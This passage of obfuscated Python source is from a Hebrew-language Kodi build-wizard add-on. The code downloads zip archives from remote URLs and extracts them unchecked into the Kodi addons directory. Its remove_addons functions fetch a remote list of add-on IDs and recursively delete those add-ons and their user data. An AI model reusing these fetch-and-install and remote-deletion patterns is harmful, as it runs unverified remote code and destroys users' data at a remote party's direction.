				except :pass #line:5145
				logging .warning (O0O0000OO0O00O0OO )#line:5146
				if 'google'in O0O0000OO0O00O0OO :#line:5147
				   OOO0O0O0O0OO0OOO0 =googledrive_download (O0O0000OO0O00O0OO ,OOOO00O00OO0O000O ,DP ,wiz .checkBuild (O0O0O0000OO000O00 ,'filesize'))#line:5148
				else :#line:5151
				  downloader .download (O0O0000OO0O00O0OO ,OOOO00O00OO0O000O ,DP )#line:5152
				xbmc .sleep (100 )#line:5153
				O0OOOOOO000O00OOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0000OO000O00 )#line:5154
				DP .update (0 ,O0OOOOOO000O00OOO ,'','אנא המתן')#line:5155
				extract .all (OOOO00O00OO0O000O ,HOME ,DP ,title =O0OOOOOO000O00OOO )#line:5156
				DP .close ()#line:5157
				wiz .defaultSkin ()#line:5158
				wiz .lookandFeelData ('save')#line:5159
				if KODIV >=18 :#line:5160
					skindialogsettind18 ()#line:5161
				if INSTALLMETHOD ==1 :OOO0O0OOO000O00O0 =1 #line:5164
				elif INSTALLMETHOD ==2 :OOO0O0OOO000O00O0 =0 #line:5165
				else :DP .close ()#line:5166
def gaiaserenaddon ():#line:5168
  OO0O00O0O00OO0OO0 =(ADDON .getSetting ("gaiaseren"))#line:5169
  OO00OO00O0OOOOOO0 =(ADDON .getSetting ("auto_rd"))#line:5170
  if OO0O00O0O00OO0OO0 =='true'and OO00OO00O0OOOOOO0 =='true':#line:5171
    OO000O0OO0000OOO0 =(NEWFASTUPDATE )#line:5172
    O00O00OOO00000000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5173
    O000O0000000OO0O0 =xbmcgui .DialogProgress ()#line:5174
    O000O0000000OO0O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5175
    O00O00OO000O0OO00 =os .path .join (PACKAGES ,'isr.zip')#line:5176
    O0OO0O00O0O00OOOO =urllib2 .Request (OO000O0OO0000OOO0 )#line:5177
    O0O0O000O0OO00O00 =urllib2 .urlopen (O0OO0O00O0O00OOOO )#line:5178
    OOO00OO00OOO00OOO =xbmcgui .DialogProgress ()#line:5180
    OOO00OO00OOO00OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5181
    OOO00OO00OOO00OOO .update (0 )#line:5182
    O0OOO0OO0O0O00000 =open (O00O00OO000O0OO00 ,'wb')#line:5184
    try :#line:5186
      O0000O0OOOO0O0000 =O0O0O000O0OO00O00 .info ().getheader ('Content-Length').strip ()#line:5187
      OO00000O0OOOOO0OO =True #line:5188
    except AttributeError :#line:5189
          OO00000O0OOOOO0OO =False #line:5190
    if OO00000O0OOOOO0OO :#line:5192
          O0000O0OOOO0O0000 =int (O0000O0OOOO0O0000 )#line:5193
    OO00O0OOOO000O0O0 =0 #line:5195
    O00OO00O00OOO0OOO =time .time ()#line:5196
    while True :#line:5197
          OO00OO00OOO0O000O =O0O0O000O0OO00O00 .read (8192 )#line:5198
          if not OO00OO00OOO0O000O :#line:5199
              sys .stdout .write ('\n')#line:5200
              break #line:5201
          OO00O0OOOO000O0O0 +=len (OO00OO00OOO0O000O )#line:5203
          O0OOO0OO0O0O00000 .write (OO00OO00OOO0O000O )#line:5204
          if not OO00000O0OOOOO0OO :#line:5206
              O0000O0OOOO0O0000 =OO00O0OOOO000O0O0 #line:5207
          if OOO00OO00OOO00OOO .iscanceled ():#line:5208
             OOO00OO00OOO00OOO .close ()#line:5209
             try :#line:5210
              os .remove (O00O00OO000O0OO00 )#line:5211
             except :#line:5212
              pass #line:5213
             break #line:5214
          OO0O00O00O0OOOOOO =float (OO00O0OOOO000O0O0 )/O0000O0OOOO0O0000 #line:5215
          OO0O00O00O0OOOOOO =round (OO0O00O00O0OOOOOO *100 ,2 )#line:5216
          OO00O0OO000O000O0 =OO00O0OOOO000O0O0 /(1024 *1024 )#line:5217
          O00OO0OO000000OO0 =O0000O0OOOO0O0000 /(1024 *1024 )#line:5218
          O0O00OO0OO0O0O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O0OO000O000O0 ,'teal',O00OO0OO000000OO0 )#line:5219
          if (time .time ()-O00OO00O00OOO0OOO )>0 :#line:5220
            O0OOO00O00OOOO000 =OO00O0OOOO000O0O0 /(time .time ()-O00OO00O00OOO0OOO )#line:5221
            O0OOO00O00OOOO000 =O0OOO00O00OOOO000 /1024 #line:5222
          else :#line:5223
           O0OOO00O00OOOO000 =0 #line:5224
          O000O0O0000OOO000 ='KB'#line:5225
          if O0OOO00O00OOOO000 >=1024 :#line:5226
             O0OOO00O00OOOO000 =O0OOO00O00OOOO000 /1024 #line:5227
             O000O0O0000OOO000 ='MB'#line:5228
          if O0OOO00O00OOOO000 >0 and not OO0O00O00O0OOOOOO ==100 :#line:5229
              OOOOOOOOOO00O0O0O =(O0000O0OOOO0O0000 -OO00O0OOOO000O0O0 )/O0OOO00O00OOOO000 #line:5230
          else :#line:5231
              OOOOOOOOOO00O0O0O =0 #line:5232
          OO0O00O0O000000OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO00O00OOOO000 ,O000O0O0000OOO000 )#line:5233
          OOO00OO00OOO00OOO .update (int (OO0O00O00O0OOOOOO ),O0O00OO0OO0O0O0OO ,OO0O00O0O000000OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5235
    O0O0O0O000000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5238
    O0OOO0OO0O0O00000 .close ()#line:5241
    extract .all (O00O00OO000O0OO00 ,O0O0O0O000000OOO0 ,OOO00OO00OOO00OOO )#line:5242
    try :#line:5246
      os .remove (O00O00OO000O0OO00 )#line:5247
    except :#line:5248
      pass #line:5249
def iptvsimpldownpc ():#line:5250
    OO00O0OO000OOOOO0 =(IPTVSIMPL18PC )#line:5252
    O0O0OO0O0O0O0O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5253
    OO000OO0O0OOOO00O =xbmcgui .DialogProgress ()#line:5254
    OO000OO0O0OOOO00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5255
    O0OOOOOOO00OOO000 =os .path .join (PACKAGES ,'isr.zip')#line:5256
    OO0O000000O00O000 =urllib2 .Request (OO00O0OO000OOOOO0 )#line:5257
    OOOO00OO00O0O0O0O =urllib2 .urlopen (OO0O000000O00O000 )#line:5258
    O00000OOO00OO00OO =xbmcgui .DialogProgress ()#line:5260
    O00000OOO00OO00OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5261
    O00000OOO00OO00OO .update (0 )#line:5262
    OOO00OOOO0O0O0O0O =open (O0OOOOOOO00OOO000 ,'wb')#line:5264
    try :#line:5266
      O00O0OO000000O0OO =OOOO00OO00O0O0O0O .info ().getheader ('Content-Length').strip ()#line:5267
      O0O00O00O000OO00O =True #line:5268
    except AttributeError :#line:5269
          O0O00O00O000OO00O =False #line:5270
    if O0O00O00O000OO00O :#line:5272
          O00O0OO000000O0OO =int (O00O0OO000000O0OO )#line:5273
    O0OOO00O00OOO0000 =0 #line:5275
    O0OO000000O00O0O0 =time .time ()#line:5276
    while True :#line:5277
          O00OO000OOO00000O =OOOO00OO00O0O0O0O .read (8192 )#line:5278
          if not O00OO000OOO00000O :#line:5279
              sys .stdout .write ('\n')#line:5280
              break #line:5281
          O0OOO00O00OOO0000 +=len (O00OO000OOO00000O )#line:5283
          OOO00OOOO0O0O0O0O .write (O00OO000OOO00000O )#line:5284
          if not O0O00O00O000OO00O :#line:5286
              O00O0OO000000O0OO =O0OOO00O00OOO0000 #line:5287
          if O00000OOO00OO00OO .iscanceled ():#line:5288
             O00000OOO00OO00OO .close ()#line:5289
             try :#line:5290
              os .remove (O0OOOOOOO00OOO000 )#line:5291
             except :#line:5292
              pass #line:5293
             break #line:5294
          OO000O00OOO0OOOOO =float (O0OOO00O00OOO0000 )/O00O0OO000000O0OO #line:5295
          OO000O00OOO0OOOOO =round (OO000O00OOO0OOOOO *100 ,2 )#line:5296
          O000O00OOO0OO0O00 =O0OOO00O00OOO0000 /(1024 *1024 )#line:5297
          O00O00O0OOO0OO0OO =O00O0OO000000O0OO /(1024 *1024 )#line:5298
          OO0O000000O00O00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000O00OOO0OO0O00 ,'teal',O00O00O0OOO0OO0OO )#line:5299
          if (time .time ()-O0OO000000O00O0O0 )>0 :#line:5300
            OO0O000O000O0OO0O =O0OOO00O00OOO0000 /(time .time ()-O0OO000000O00O0O0 )#line:5301
            OO0O000O000O0OO0O =OO0O000O000O0OO0O /1024 #line:5302
          else :#line:5303
           OO0O000O000O0OO0O =0 #line:5304
          O00OOO00O00OOO00O ='KB'#line:5305
          if OO0O000O000O0OO0O >=1024 :#line:5306
             OO0O000O000O0OO0O =OO0O000O000O0OO0O /1024 #line:5307
             O00OOO00O00OOO00O ='MB'#line:5308
          if OO0O000O000O0OO0O >0 and not OO000O00OOO0OOOOO ==100 :#line:5309
              O000OOO0O00O0O000 =(O00O0OO000000O0OO -O0OOO00O00OOO0000 )/OO0O000O000O0OO0O #line:5310
          else :#line:5311
              O000OOO0O00O0O000 =0 #line:5312
          OO0O00O000O0O0OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O000O000O0OO0O ,O00OOO00O00OOO00O )#line:5313
          O00000OOO00OO00OO .update (int (OO000O00OOO0OOOOO ),OO0O000000O00O00O ,OO0O00O000O0O0OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5315
    OO000000OO0000O0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5318
    OOO00OOOO0O0O0O0O .close ()#line:5321
    extract .all (O0OOOOOOO00OOO000 ,OO000000OO0000O0O ,O00000OOO00OO00OO )#line:5322
    try :#line:5326
      os .remove (O0OOOOOOO00OOO000 )#line:5327
    except :#line:5328
      pass #line:5329
def iptvsimpldown ():#line:5330
    O00O0O00OOOO00O00 =(IPTVSIMPL18 )#line:5332
    OOO0000O000OO000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5333
    O0O0OOO000OO0OO00 =xbmcgui .DialogProgress ()#line:5334
    O0O0OOO000OO0OO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5335
    O00O0OOOOOO0000O0 =os .path .join (PACKAGES ,'isr.zip')#line:5336
    O0OO0OOO0000OO0OO =urllib2 .Request (O00O0O00OOOO00O00 )#line:5337
    OOO0000O00OO00OOO =urllib2 .urlopen (O0OO0OOO0000OO0OO )#line:5338
    O00O0OOOOO0OOO00O =xbmcgui .DialogProgress ()#line:5340
    O00O0OOOOO0OOO00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5341
    O00O0OOOOO0OOO00O .update (0 )#line:5342
    O0000000O00OO0O00 =open (O00O0OOOOOO0000O0 ,'wb')#line:5344
    try :#line:5346
      OOO00O0O0OOO0O0O0 =OOO0000O00OO00OOO .info ().getheader ('Content-Length').strip ()#line:5347
      O0O00O00000O000OO =True #line:5348
    except AttributeError :#line:5349
          O0O00O00000O000OO =False #line:5350
    if O0O00O00000O000OO :#line:5352
          OOO00O0O0OOO0O0O0 =int (OOO00O0O0OOO0O0O0 )#line:5353
    OO00OOO00O00OO000 =0 #line:5355
    O0000O0000OO0O000 =time .time ()#line:5356
    while True :#line:5357
          OO000OOOOOOO0O000 =OOO0000O00OO00OOO .read (8192 )#line:5358
          if not OO000OOOOOOO0O000 :#line:5359
              sys .stdout .write ('\n')#line:5360
              break #line:5361
          OO00OOO00O00OO000 +=len (OO000OOOOOOO0O000 )#line:5363
          O0000000O00OO0O00 .write (OO000OOOOOOO0O000 )#line:5364
          if not O0O00O00000O000OO :#line:5366
              OOO00O0O0OOO0O0O0 =OO00OOO00O00OO000 #line:5367
          if O00O0OOOOO0OOO00O .iscanceled ():#line:5368
             O00O0OOOOO0OOO00O .close ()#line:5369
             try :#line:5370
              os .remove (O00O0OOOOOO0000O0 )#line:5371
             except :#line:5372
              pass #line:5373
             break #line:5374
          OO00OOOOOOO00O0O0 =float (OO00OOO00O00OO000 )/OOO00O0O0OOO0O0O0 #line:5375
          OO00OOOOOOO00O0O0 =round (OO00OOOOOOO00O0O0 *100 ,2 )#line:5376
          O0OOO0OO00OOOOOOO =OO00OOO00O00OO000 /(1024 *1024 )#line:5377
          OO0O000000O0O00O0 =OOO00O0O0OOO0O0O0 /(1024 *1024 )#line:5378
          OOOOOOO0OO00O00OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO0OO00OOOOOOO ,'teal',OO0O000000O0O00O0 )#line:5379
          if (time .time ()-O0000O0000OO0O000 )>0 :#line:5380
            OO00O000O0OOO000O =OO00OOO00O00OO000 /(time .time ()-O0000O0000OO0O000 )#line:5381
            OO00O000O0OOO000O =OO00O000O0OOO000O /1024 #line:5382
          else :#line:5383
           OO00O000O0OOO000O =0 #line:5384
          OO00OO0O0OO000OO0 ='KB'#line:5385
          if OO00O000O0OOO000O >=1024 :#line:5386
             OO00O000O0OOO000O =OO00O000O0OOO000O /1024 #line:5387
             OO00OO0O0OO000OO0 ='MB'#line:5388
          if OO00O000O0OOO000O >0 and not OO00OOOOOOO00O0O0 ==100 :#line:5389
              O0OOO0O0000O0OOOO =(OOO00O0O0OOO0O0O0 -OO00OOO00O00OO000 )/OO00O000O0OOO000O #line:5390
          else :#line:5391
              O0OOO0O0000O0OOOO =0 #line:5392
          O0OOOO00OO0OOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O000O0OOO000O ,OO00OO0O0OO000OO0 )#line:5393
          O00O0OOOOO0OOO00O .update (int (OO00OOOOOOO00O0O0 ),OOOOOOO0OO00O00OO ,O0OOOO00OO0OOO00O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5395
    O0O000OO000O0000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5398
    O0000000O00OO0O00 .close ()#line:5401
    extract .all (O00O0OOOOOO0000O0 ,O0O000OO000O0000O ,O00O0OOOOO0OOO00O )#line:5402
    try :#line:5406
      os .remove (O00O0OOOOOO0000O0 )#line:5407
    except :#line:5408
      pass #line:5409
def testnotify ():#line:5410
	O0OO000O0O0OOOO0O =wiz .workingURL (NOTIFICATION )#line:5411
	if O0OO000O0O0OOOO0O ==True :#line:5412
		try :#line:5413
			O00O00OOOO00OO00O ,OO0OOOO0OOOO0000O =wiz .splitNotify (NOTIFICATION )#line:5414
			if O00O00OOOO00OO00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5415
			if STARTP2 ()=='ok':#line:5416
				notify .notification (OO0OOOO0OOOO0000O ,True )#line:5417
		except Exception as OO0O00OO0000OOO00 :#line:5418
			wiz .log ("Error on Notifications Window: %s"%str (OO0O00OO0000OOO00 ),xbmc .LOGERROR )#line:5419
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5420
def testnotify2 ():#line:5421
	OOO000O00O0OO0000 =wiz .workingURL (NOTIFICATION2 )#line:5422
	if OOO000O00O0OO0000 ==True :#line:5423
		try :#line:5424
			OO000OO0O00O0000O ,O0OO000O0OOOO0OOO =wiz .splitNotify (NOTIFICATION2 )#line:5425
			if OO000OO0O00O0000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5426
			if STARTP2 ()=='ok':#line:5427
				notify .notification2 (O0OO000O0OOOO0OOO ,True )#line:5428
		except Exception as OO00000O00OOO00OO :#line:5429
			wiz .log ("Error on Notifications Window: %s"%str (OO00000O00OOO00OO ),xbmc .LOGERROR )#line:5430
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5431
def testnotify3 ():#line:5432
	OOO00OO0OO0000O0O =wiz .workingURL (NOTIFICATION3 )#line:5433
	if OOO00OO0OO0000O0O ==True :#line:5434
		try :#line:5435
			OOO0000OO0O0OOOO0 ,OOO0OO0OO0O00O0O0 =wiz .splitNotify (NOTIFICATION3 )#line:5436
			if OOO0000OO0O0OOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5437
			if STARTP2 ()=='ok':#line:5438
				notify .notification3 (OOO0OO0OO0O00O0O0 ,True )#line:5439
		except Exception as OO0OO00O0OOOOOO0O :#line:5440
			wiz .log ("Error on Notifications Window: %s"%str (OO0OO00O0OOOOOO0O ),xbmc .LOGERROR )#line:5441
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5442
def servicemanual ():#line:5443
	O0O000OOOOO0OOO00 =wiz .workingURL (HELPINFO )#line:5444
	if O0O000OOOOO0OOO00 ==True :#line:5445
		try :#line:5446
			OO0OO00OOOO00OO0O ,OOOO0OO0OOO0O0O0O =wiz .splitNotify (HELPINFO )#line:5447
			if OO0OO00OOOO00OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5448
			notify .helpinfo (OOOO0OO0OOO0O0O0O ,True )#line:5449
		except Exception as OOO00O000O000OO0O :#line:5450
			wiz .log ("Error on Notifications Window: %s"%str (OOO00O000O000OO0O ),xbmc .LOGERROR )#line:5451
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5452
def testupdate ():#line:5454
	if BUILDNAME =="":#line:5455
		notify .updateWindow ()#line:5456
	else :#line:5457
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5458
def testfirst ():#line:5460
	notify .firstRun ()#line:5461
def testfirstRun ():#line:5463
	notify .firstRunSettings ()#line:5464
def fastinstall ():#line:5467
	notify .firstRuninstall ()#line:5468
def addDir (O0OO000O0O0O00OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5475
	OO00O0000O0O0OO0O =sys .argv [0 ]#line:5476
	if not mode ==None :OO00O0000O0O0OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5477
	if not name ==None :OO00O0000O0O0OO0O +="&name="+urllib .quote_plus (name )#line:5478
	if not url ==None :OO00O0000O0O0OO0O +="&url="+urllib .quote_plus (url )#line:5479
	OO0OO0OO0OOOO0000 =True #line:5480
	if themeit :O0OO000O0O0O00OOO =themeit %O0OO000O0O0O00OOO #line:5481
	O0OO0O0OOOOOOO0O0 =xbmcgui .ListItem (O0OO000O0O0O00OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5482
	O0OO0O0OOOOOOO0O0 .setInfo (type ="Video",infoLabels ={"Title":O0OO000O0O0O00OOO ,"Plot":description })#line:5483
	O0OO0O0OOOOOOO0O0 .setProperty ("Fanart_Image",fanart )#line:5484
	if not menu ==None :O0OO0O0OOOOOOO0O0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5485
	OO0OO0OO0OOOO0000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00O0000O0O0OO0O ,listitem =O0OO0O0OOOOOOO0O0 ,isFolder =True )#line:5486
	return OO0OO0OO0OOOO0000 #line:5487
def addFile (O00O00O0O0OO0O0O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5489
	O0OO0O0O000OOOO0O =sys .argv [0 ]#line:5490
	if not mode ==None :O0OO0O0O000OOOO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5491
	if not name ==None :O0OO0O0O000OOOO0O +="&name="+urllib .quote_plus (name )#line:5492
	if not url ==None :O0OO0O0O000OOOO0O +="&url="+urllib .quote_plus (url )#line:5493
	O0O00000000OOO0OO =True #line:5494
	if themeit :O00O00O0O0OO0O0O0 =themeit %O00O00O0O0OO0O0O0 #line:5495
	OOO0OO0OOOOO0OO00 =xbmcgui .ListItem (O00O00O0O0OO0O0O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5496
	OOO0OO0OOOOO0OO00 .setInfo (type ="Video",infoLabels ={"Title":O00O00O0O0OO0O0O0 ,"Plot":description })#line:5497
	OOO0OO0OOOOO0OO00 .setProperty ("Fanart_Image",fanart )#line:5498
	if not menu ==None :OOO0OO0OOOOO0OO00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5499
	O0O00000000OOO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO0O0O000OOOO0O ,listitem =OOO0OO0OOOOO0OO00 ,isFolder =False )#line:5500
	return O0O00000000OOO0OO #line:5501
def get_params ():#line:5503
	O000OOO000O0O00O0 =[]#line:5504
	O0OO00OO000OOO000 =sys .argv [2 ]#line:5505
	if len (O0OO00OO000OOO000 )>=2 :#line:5506
		OO00O0OOO0O0O00OO =sys .argv [2 ]#line:5507
		O00O0OO00OOOOOO0O =OO00O0OOO0O0O00OO .replace ('?','')#line:5508
		if (OO00O0OOO0O0O00OO [len (OO00O0OOO0O0O00OO )-1 ]=='/'):#line:5509
			OO00O0OOO0O0O00OO =OO00O0OOO0O0O00OO [0 :len (OO00O0OOO0O0O00OO )-2 ]#line:5510
		OO0O00OOOO0OO0O00 =O00O0OO00OOOOOO0O .split ('&')#line:5511
		O000OOO000O0O00O0 ={}#line:5512
		for O0OO00000OO00O0OO in range (len (OO0O00OOOO0OO0O00 )):#line:5513
			OOOOOO0O00OO0O00O ={}#line:5514
			OOOOOO0O00OO0O00O =OO0O00OOOO0OO0O00 [O0OO00000OO00O0OO ].split ('=')#line:5515
			if (len (OOOOOO0O00OO0O00O ))==2 :#line:5516
				O000OOO000O0O00O0 [OOOOOO0O00OO0O00O [0 ]]=OOOOOO0O00OO0O00O [1 ]#line:5517
		return O000OOO000O0O00O0 #line:5519
def remove_addons ():#line:5521
	try :#line:5522
			import json #line:5523
			OOOOO000O0OO000OO =urllib2 .urlopen (remove_url ).readlines ()#line:5524
			for O0O0O00000O000O0O in OOOOO000O0OO000OO :#line:5525
				OOO0O00O0OOO00OOO =O0O0O00000O000O0O .split (':')[1 ].strip ()#line:5527
				O000OO0OO00OOOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOO0O00O0OOO00OOO ,'false')#line:5528
				OO0OO0OO00OOOO0O0 =xbmc .executeJSONRPC (O000OO0OO00OOOOOO )#line:5529
				O000OOOOOOO0O0O0O =json .loads (OO0OO0OO00OOOO0O0 )#line:5530
				O0OO0O000OO0000OO =os .path .join (addons_folder ,OOO0O00O0OOO00OOO )#line:5532
				if os .path .exists (O0OO0O000OO0000OO ):#line:5534
					for OOO0O00OO0O00OO00 ,O0O0000OO00O000OO ,OOOO0OO0O000OO0O0 in os .walk (O0OO0O000OO0000OO ):#line:5535
						for O0OOOO00O0O000OOO in OOOO0OO0O000OO0O0 :#line:5536
							os .unlink (os .path .join (OOO0O00OO0O00OO00 ,O0OOOO00O0O000OOO ))#line:5537
						for OOO0OO0O0OOO0O0O0 in O0O0000OO00O000OO :#line:5538
							shutil .rmtree (os .path .join (OOO0O00OO0O00OO00 ,OOO0OO0O0OOO0O0O0 ))#line:5539
					os .rmdir (O0OO0O000OO0000OO )#line:5540
			xbmc .executebuiltin ('Container.Refresh')#line:5542
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5543
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5544
	except :pass #line:5545
def remove_addons2 ():#line:5546
	try :#line:5547
			import json #line:5548
			OO0O000OO00OO00O0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5549
			for OO0OOOOOO00O0O0O0 in OO0O000OO00OO00O0 :#line:5550
				OOOOO0O00OOO0000O =OO0OOOOOO00O0O0O0 .split (':')[1 ].strip ()#line:5552
				O0O0OO0O0O0OOO000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOOOO0O00OOO0000O ,'false')#line:5553
				O00O00000OOOO0O00 =xbmc .executeJSONRPC (O0O0OO0O0O0OOO000 )#line:5554
				OO00OO0O00O000O00 =json .loads (O00O00000OOOO0O00 )#line:5555
				O0O0O000OOO0O00O0 =os .path .join (user_folder ,OOOOO0O00OOO0000O )#line:5557
				if os .path .exists (O0O0O000OOO0O00O0 ):#line:5559
					for O0OO00000000OO000 ,O000OOOO00O00O000 ,O00OOO0O000OOOO0O in os .walk (O0O0O000OOO0O00O0 ):#line:5560
						for OO0OO0O0O0OOOO0OO in O00OOO0O000OOOO0O :#line:5561
							os .unlink (os .path .join (O0OO00000000OO000 ,OO0OO0O0O0OOOO0OO ))#line:5562
						for O0O0OOOOOO0O00OO0 in O000OOOO00O00O000 :#line:5563
							shutil .rmtree (os .path .join (O0OO00000000OO000 ,O0O0OOOOOO0O00OO0 ))#line:5564
					os .rmdir (O0O0O000OOO0O00O0 )#line:5565
	except :pass #line:5567
params =get_params ()#line:5568
url =None #line:5569
name =None #line:5570
mode =None #line:5571
try :mode =urllib .unquote_plus (params ["mode"])#line:5573
except :pass #line:5574
try :name =urllib .unquote_plus (params ["name"])#line:5575
except :pass #line:5576
try :url =urllib .unquote_plus (params ["url"])#line:5577
except :pass #line:5578
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5580
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5581
def setView (O0OO00O000O00O0O0 ,O0O0OO00O000OOOOO ):#line:5582
	if wiz .getS ('auto-view')=='true':#line:5583
		O00O00OOOOOOO00OO =wiz .getS (O0O0OO00O000OOOOO )#line:5584
		if O00O00OOOOOOO00OO =='50'and KODIV >=17 and SKIN =='skin.estuary':O00O00OOOOOOO00OO ='55'#line:5585
		if O00O00OOOOOOO00OO =='500'and KODIV >=17 and SKIN =='skin.estuary':O00O00OOOOOOO00OO ='50'#line:5586
		wiz .ebi ("Container.SetViewMode(%s)"%O00O00OOOOOOO00OO )#line:5587
if mode ==None :index ()#line:5589
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5591
elif mode =='builds':buildMenu ()#line:5592
elif mode =='viewbuild':viewBuild (name )#line:5593
elif mode =='buildinfo':buildInfo (name )#line:5594
elif mode =='buildpreview':buildVideo (name )#line:5595
elif mode =='install':buildWizard (name ,url )#line:5596
elif mode =='theme':buildWizard (name ,mode ,url )#line:5597
elif mode =='viewthirdparty':viewThirdList (name )#line:5598
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5599
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5600
elif mode =='maint':maintMenu (name )#line:5602
elif mode =='passpin':passandpin ()#line:5603
elif mode =='backmyupbuild':backmyupbuild ()#line:5604
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5605
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5606
elif mode =='advancedsetting':advancedWindow (name )#line:5607
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5608
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5609
elif mode =='asciicheck':wiz .asciiCheck ()#line:5610
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5611
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5612
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5613
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5614
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5615
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5616
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5617
elif mode =='currentsettings':viewAdvanced ()#line:5618
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5619
